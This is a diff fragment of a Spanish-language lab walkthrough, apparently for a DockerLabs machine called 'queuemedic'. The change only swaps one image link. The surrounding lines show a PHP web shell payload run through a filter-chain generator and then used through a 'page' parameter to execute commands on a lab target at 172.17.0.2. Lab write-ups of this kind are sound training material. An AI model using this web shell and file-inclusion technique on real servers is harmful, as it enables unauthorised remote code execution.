@@ -89,8 +89,8 @@ ahora  en el terminal colocamos:
 > python3 filter.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
 
 nos dará un código que lo copiamos
-![[dockerlabs/dificil/queuemedic/codigo2.png]]
 
+![image](https://github.com/user-attachments/assets/4759141d-7a61-4ab1-8159-6bf156d6cb2d)
 
 y colocamos el buscador así:  172.17.0.2/?cmd=ls -la&page= y aquí colocamos el código que nos dio  que es vulnerable a ejecución de código remoto (RCE)
 ![[dockerlabs/dificil/queuemedic/codigo3.png]]
